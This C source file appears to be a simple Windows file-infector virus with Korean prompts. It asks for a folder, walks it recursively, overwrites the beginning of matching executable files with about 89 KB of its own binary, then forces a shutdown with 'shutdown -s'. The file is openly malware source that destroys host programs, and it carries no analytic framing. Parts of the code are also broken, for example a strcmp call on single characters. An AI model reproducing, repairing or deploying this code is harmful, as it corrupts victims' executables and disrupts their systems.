#include<stdio.h>
#include<io.h>
#include <Windows.h>
#include <time.h>
#include<dos.h>
#include<conio.h>
void infection(char sourcefile[], char infectionfile[])
{
	FILE *virus, *host;
	unsigned long x;
	char buff[2048];
	long handel;
	virus = fopen(sourcefile, "rb");
	host = fopen(infectionfile, "rb + ");
	if (host == NULL)
	{
		return;
	}
	x = 89088;
	printf("Infecting %s\n", infectionfile);
	while (x > 2048)
	{
		fread(buff, 2048, 1, virus);
		fwrite(buff, 2048, 1, host);
		x -= 2048;
	}
	fread(buff, x, 1, virus);
	fwrite(buff, x, 1, host);
	fcloseall();
}
int infec_findfile(char path[], char source[])
{
	char temp[1024] = "", temp1[1024] = "";
	int result = 1, len;
	struct _finddata_t fd;
	long handel;
	strcpy(temp, path);
	strcpy(temp1, path);

	handel = _findfirst(temp, &fd);
	if (handel == -1)
	{
		return -1;
	}
	len = strlen(temp);
	temp[len - 3] = '\0';
	while (result != -1)
	{
		if (fd.size != 0)
		{
			sprintf(temp1, "%s%s", temp, fd.name);
			len = strlen(temp1);
			if(strcmp(temp1[len-3],'e')==0)
				infection(source, temp1);
		}
		else if (!strcmp(fd.name, ".") || !strcmp(fd.name, ".."))
			printf("\n%s%s\n", temp, fd.name);
		else
		{
			sprintf(temp1, "%s%s\\*.*", temp, fd.name);
			if (infec_findfile(temp1, source) == -1)
			{
				len = strlen(temp1);
				temp1[len - 3] = '\0';
			}
		}
		result = _findnext(handel, &fd);
	}
	_findclose(handel);
	return 0;
}
void infec(char source[])
{
	char str[1024];
	printf("감염시킬 폴더 입력:");
	scanf("%s", &str);
	infec_findfile(str, source);
}
void virus(char source[])
{
	infec(source);
	printf("바이러스 감염\n");
	Sleep(1000);
	system("shutdown -s");
}
